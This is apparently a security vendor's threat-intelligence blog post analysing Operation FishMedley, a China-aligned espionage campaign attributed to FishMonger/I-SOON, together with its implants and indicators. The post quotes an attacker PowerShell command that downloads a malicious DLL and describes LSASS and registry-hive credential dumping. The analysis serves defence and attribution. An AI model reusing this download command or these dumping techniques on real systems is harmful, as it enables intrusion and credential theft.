                    <div class="article-body">
    <p>On March 5<sup>th</sup>, 2025, the US DOJ unsealed an indictment against employees of the Chinese contractor I‑SOON for their involvement in multiple global espionage operations. Those include attacks that we previously documented and attributed to the FishMonger APT group &ndash; I‑SOON&rsquo;s operational arm &ndash; including the compromise of seven organizations that we identified as being targeted in a 2022 campaign that we named Operation FishMedley.</p>
<blockquote>
<div><strong>Key points of this blogpost:</strong></div>
<ul>
<li>Verticals targeted during Operation FishMedley include governments, NGOs, and think tanks, across Asia, Europe, and the United States.</li>
<li>Operators used implants &ndash; such as ShadowPad, SodaMaster, and Spyder &ndash; that are common or exclusive to China-aligned threat actors.</li>
<li>We assess with high confidence that Operation FishMedley was conducted by the FishMonger APT group.</li>
<li>Independent of the DOJ indictment, we determined that FishMonger is operated by I‑SOON.</li>
</ul>
</blockquote>
<h2>FishMonger profile</h2>
<p>FishMonger &ndash; a group believed to be operated by the Chinese contractor I‑SOON (see our <a href="https://web-assets.esetstatic.com/wls/en/papers/threat-reports/eset-apt-activity-report-q4-2023-q1-2024.pdf" target="_blank" rel="noopener">Q4&nbsp;2023-Q1&nbsp;2024 APT Activity Report</a>) &ndash; falls under the Winnti Group umbrella and is most likely operating out of China, from the city of Chengdu where I‑SOON&rsquo;s office was <a href="https://substack.com/home/post/p-155672015">located</a>. FishMonger is also known as Earth Lusca, TAG‑22, Aquatic Panda, or Red Dev 10. We <a href="https://www.welivesecurity.com/2020/01/31/winnti-group-targeting-universities-hong-kong/" target="_blank" rel="noopener">published</a> an analysis of this group in early 2020 when it heavily targeted universities in Hong Kong during the civic protests that started in June 2019. We initially attributed the incident to Winnti Group but have since revised our attribution to FishMonger.</p>
<p>The group is known to operate watering-hole attacks, as reported by <a href="https://www.trendmicro.com/en_us/research/21/g/biopass-rat-new-malware-sniffs-victims-via-live-streaming.html" target="_blank" rel="noopener">Trend Micro</a>. FishMonger&rsquo;s toolset includes ShadowPad, Spyder, Cobalt Strike, FunnySwitch, SprySOCKS, and the BIOPASS RAT.</p>
<h2>Overview</h2>
<p>On March 5<sup>th</sup>, 2025, the US Department of Justice published a <a href="https://www.justice.gov/opa/pr/justice-department-charges-12-chinese-contract-hackers-and-law-enforcement-officers-global" target="_blank" rel="noopener">press release</a> and unsealed an <a href="https://www.justice.gov/usao-sdny/media/1391751/dl?inline" target="_blank" rel="noopener">indictment</a> against I‑SOON employees and officers of China&rsquo;s Ministry of Public Security involved in multiple espionage campaigns from 2016 to 2023. The FBI also added those named in the indictment to its <a href="https://www.fbi.gov/wanted/cyber/aquatic-panda-cyber-threat-actors" target="_blank" rel="noopener">&ldquo;most wanted&rdquo; list</a> and published a poster, as seen in Figure 1.</p>
<figure class="image align-center"><img title="Figure 1. Names of FishMonger / I-SOON members (source: FBI)" src="https://web-assets.esetstatic.com/wls/2025/03-25/fishmedley/figure-1.gif" alt="Figure 1. Names of FishMonger I-SOON members" width="" height="" />
<figcaption><em>Figure 1. Names of FishMonger / I‑SOON members (source: FBI)</em></figcaption>
</figure>
<p>The indictment describes several attacks that are strongly related to what we published in a <a href="https://www.eset.com/int/business/services/threat-intelligence/" target="_blank" rel="noopener">private APT intelligence report</a> in early 2023. In this blogpost, we share our technical knowledge about this global campaign that targeted governments, NGOs, and think tanks across Asia, Europe, and the United States. We believe that this information complements the recently published indictment.</p>
<p>During 2022, we investigated several compromises where implants such as ShadowPad and SodaMaster, which are commonly employed by China-aligned threat actors, were used. We were able to cluster seven independent incidents for this blogpost and have named that campaign Operation FishMedley.</p>
<h3>FishMonger and I-SOON</h3>
<p>During our research, we were able to independently determine that FishMonger is an espionage team operated by I‑SOON, a Chinese contractor based in Chengdu that suffered an infamous document leak in 2024 &ndash; see this comprehensive analysis from <a href="https://harfanglab.io/insidethelab/isoon-leak-analysis/">Harfang Labs</a>.</p>

<h2>Technical analysis</h2>
<h3>Initial access</h3>
<p>We were unable to identify the initial compromise vectors. For most cases, the attackers seemed to have had privileged access inside the local network, such as domain administrator credentials.</p>
<p>At Victim D, the attackers gained access to an admin console and used it to deploy implants on other machines in the local network. It is probable that they first compromised the machine of a sysadmin or security analyst and then stole credentials that allowed them to connect to the console.</p>
<p>At Victim F, the implants were delivered using <a href="https://github.com/fortra/impacket">Impacket</a>, which means that the attackers somehow previously compromised a high-privilege domain account.</p>
<h3>Lateral movement</h3>
<p>At Victim F, the operators also used Impacket to move laterally. They gathered information on other local machines and installed implants.</p>
<p>Table 3 shows that the operators first did some manual reconnaissance using <span style="font-family: courier new, courier, monospace;">quser.exe</span>, <span style="font-family: courier new, courier, monospace;">wmic.exe</span>, and <span style="font-family: courier new, courier, monospace;">ipconfig.exe</span>. Then they tried to get credentials and other secrets by <a href="https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/">dumping</a> the local security authority subsystem service (LSASS) process (PID 944). The PID of the process was obtained via <span style="font-family: courier new, courier, monospace;">tasklist /svc</span> and the dump was performed using <span style="font-family: courier new, courier, monospace;">comsvcs.dll</span>, which is a known living-off-the-land binary (<a href="https://lolbas-project.github.io/lolbas/Libraries/comsvcs/">LOLBIN</a>). Note that it is likely that the attackers executed <span style="font-family: courier new, courier, monospace;">quser.exe</span> to see whether other users or admins were also logged in, meaning privileged accesses were present in LSASS. According to <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/quser">Microsoft documentation</a>, to use this command the attacker must have Full Control permission or special access permission.</p>
<p>They also saved the registry hives <span style="font-family: courier new, courier, monospace;">sam.hive</span> and <span style="font-family: courier new, courier, monospace;">system.hive</span>, which can both contain secrets or credentials.</p>
<p>Finally, they tried to dump the LSASS process again, using a <span style="font-family: courier new, courier, monospace;">for</span> loop iterating over the output from <span style="font-family: courier new, courier, monospace;">tasklist.exe</span>. We have seen this same code used on other machines, so it is a good idea to block or at least alert on it.</p>

<h3>Toolset</h3>
<h4>ShadowPad</h4>
<p>ShadowPad is a well-known and privately sold modular backdoor, known to only be supplied to China-aligned APT groups, including <a href="https://www.welivesecurity.com/2020/01/31/winnti-group-targeting-universities-hong-kong/">FishMonger</a> and <a href="https://www.welivesecurity.com/2021/08/24/sidewalk-may-be-as-dangerous-as-crosswalk/">SparklingGoblin</a>, as documented by <a href="https://assets.sentinelone.com/c/Shadowpad?x=P42eqA#page=1">SentinelOne</a>. In Operation FishMedley, the attackers used a ShadowPad version packed with <a href="https://www.pwc.co.uk/issues/cyber-security-services/research/chasing-shadows.html">ScatterBee</a>.</p>
<p>At Victim D, the loader was downloaded using the following PowerShell command:</p>
<p><span style="font-family: courier new, courier, monospace;">powershell (new-object System.Net.WebClient).DownloadFile("http://&lt;victim&rsquo;s_web_server_IP_address&gt;/Images/menu/log.dll";"c:\users\public\log.dll")</span></p>
<p>This shows that the attackers compromised a web server at the victim&rsquo;s organization to use it as a staging server for their malware.</p>
<p>At Victim F, Firefox was used to download the loader, from <span style="font-family: courier new, courier, monospace;">http://5.188.230[.]47/log.dll</span>. We don&rsquo;t know whether attackers had interactive access to the machine, whether another piece of malware was running in the Firefox process, or whether the victim was redirected to the download page, say via a watering-hole attack.</p>
<p><span style="font-family: courier new, courier, monospace;">log.dll</span> is side-loaded by an old Bitdefender executable (original name: <span style="font-family: courier new, courier, monospace;">BDReinit.exe</span>) and loads ShadowPad from a file named <span style="font-family: courier new, courier, monospace;">log.dll.dat</span>, which can be decrypted using the scripts provided in PwC&rsquo;s <a href="https://github.com/PwCUK-CTO/ScatterBee_Analysis">GitHub</a> repository.</p>
<p>We did not recover the <span style="font-family: courier new, courier, monospace;">log.dll.dat</span> from the victim&rsquo;s machine, but we found a fake Adobe Flash installer on <a href="https://www.virustotal.com/gui/file/9447B75AF497E5A7F99F1DED1C1D87C53B5B59FCE224A325932AD55EEF9E0E4A">VirusTotal</a> with the identical <span style="font-family: courier new, courier, monospace;">log.dll</span> file. <h4>Spyder</h4>
<p>At Victim D, we detected another backdoor typically used by FishMonger: Spyder, a modular implant that was analyzed in great detail by <a href="https://st.drweb.com/static/new-www/news/2021/march/BackDoor.Spyder.1_en.pdf">Dr.Web</a>.</p>
<p>A Spyder loader was downloaded from <span style="font-family: courier new, courier, monospace;">http://&lt;a_victim&rsquo;s_web_server_IP_address&gt;/Images/menu/aa.doc</span> and dropped to <span style="font-family: courier new, courier, monospace;">C:\Users\Public\task.exe</span> around 18 hours after ShadowPad was installed.</p>
<p>The loader &ndash; see Figure 2; reads the file <span style="font-family: courier new, courier, monospace;">c:\windows\temp\guid.dat</span> and decrypts its contents using AES-CBC. The encryption key is hardcoded: <span style="font-family: courier new, courier, monospace; white-space: nowrap;">F4 E4 C6 9E DE E0 9E 82 00 00 00 00 00 00 00 00</span>. The initialization vector (IV) is the first eight bytes of the key. Unfortunately, we were unable to recover the <span style="font-family: courier new, courier, monospace;">guid.dat</span> file.</p>

<p>Despite not obtaining the encrypted final payload, our product did detect a Spyder payload in memory and it was almost identical to the Spyder variant documented by Dr.Web. The C&amp;C server was hardcoded to <span style="font-family: courier new, courier, monospace;">61.238.103[.]165</span>.</p>
<p>Interestingly, multiple subdomains of <span style="font-family: courier new, courier, monospace;">junlper[.]com</span>, a known Spyder C&amp;C domain and a weak homoglyph domain to <span style="font-family: courier new, courier, monospace;">juniper.net</span>, resolved to <span style="font-family: courier new, courier, monospace;">61.238.103[.]165</span> in 2022.</p>
<p>A self-signed TLS certificate was present on port 443 of the server from May to December 2022, with the thumbprint <span style="font-family: courier new, courier, monospace;">89EDCFFC66EDA3AEB75E140816702F9AC73A75F0</span>. According to <a href="https://github.com/SentineLabs/Shadowpad/blob/main/technical-indicators">SentinelOne</a>, it is a certificate used by FishMonger for its C&amp;C servers.</p>
<h4>SodaMaster</h4>
<p>SodaMaster is a backdoor that was documented by <a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/">Kaspersky</a> in 2021. APT10 was the first group known to have access to this backdoor but Operation FishMedley indicates that it may now be shared among multiple China-aligned APT groups.</p>
<p>SodaMaster can only be found decrypted in memory and that&rsquo;s where we detected it. Even though we did not recover the full loading chain, we have identified a few samples that are the first step of the chain.</p>

<h4>RPipeCommander</h4>
<p>At Victim D, we captured a previously unknown implant in the same process where Spyder was running. It was probably loaded from disk or downloaded by Spyder. Because its DLL export name was <span style="font-family: courier new, courier, monospace;">rcmd64.dll</span>, we named this implant RPipeCommander.</p>
<p>RPipeCommander is multithreaded and uses <span style="font-family: courier new, courier, monospace;">IoCompletionPort</span> to manage the I/O requests of the multiple threads. It creates the named pipe <span style="font-family: courier new, courier, monospace;">\\.\Pipe\CmdPipe&lt;PID&gt;</span>, where <span style="font-family: courier new, courier, monospace;">&lt;PID&gt;</span> is the current process ID, and reads from and writes into this pipe.</p>
<p>RPipeCommander is a reverse shell that accepts three commands via the named pipe:</p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">h</span> (<span style="font-family: courier new, courier, monospace;">0x68</span>): create a <span style="font-family: courier new, courier, monospace;">cmd.exe</span> process and bind pipes to the process to send commands and read the output.</li>
<li><span style="font-family: courier new, courier, monospace;">i</span> (<span style="font-family: courier new, courier, monospace;">0x69</span>): Write a command in the existing <span style="font-family: courier new, courier, monospace;">cmd.exe</span> process or read the output of the previous command.</li>
<li><span style="font-family: courier new, courier, monospace;">j</span> (<span style="font-family: courier new, courier, monospace;">0x6A</span>): exit the <span style="font-family: courier new, courier, monospace;">cmd.exe</span> process by writing <span style="font-family: courier new, courier, monospace;">exit\r\n</span> in the command shell.</li>
</ul>
<p>Note that it seems we only have the server side of RPipeCommander. It is likely that a second component, a client, is used to send commands to the server from another machine on the local network.</p>
<p>Finally, RPipeCommander is written in C++ and RTTI information was included in the captured samples, allowing us to obtain some of the class names:</p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">CPipeServer</span></li>
<li><span style="font-family: courier new, courier, monospace;">CPipeBuffer</span></li>
<li><span style="font-family: courier new, courier, monospace;">CPipeSrvEvent</span></li>
<li><span style="font-family: courier new, courier, monospace;">CPipeServerEventHandler</span></li>
</ul>
